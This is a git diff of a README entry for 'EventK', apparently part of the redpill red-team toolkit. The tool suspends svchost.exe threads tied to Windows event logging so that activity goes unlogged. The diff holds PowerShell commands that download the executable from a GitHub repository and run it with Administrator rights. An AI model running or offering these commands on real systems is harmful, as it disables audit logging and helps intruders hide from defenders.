@@ -2,20 +2,23 @@
 
 |Binary Name|Description|Privileges|Notes|
 |---|---|---|---|
-|EventK|Patch the ETWEventWrite function to<br />prevent the creation of logfiles|Administrator|Suspend thread in svchost.exe related<br />to event logging (@SolomonSklash)<br />[Screenshot](https://naoexiste)|
+|EventK|Suspend thread in svchost.exe related to event logging (@SolomonSklash)|Administrator|[Screenshot](https://naoexiste)|
 
 <br />
 
+redpill v1.2.6 - RedTeam database library
+
+
 **Download cmdlet:**
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/ETWpatch/EventK.exe" -OutFile "EventK.exe"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/ETWpatch/eventK.exe" -OutFile "eventK.exe"
 ```
 
 <br />
 
 **Execute:**
 ```powershell
-.\EventK.exe
+.\eventK.exe
 ```
 
 <br />
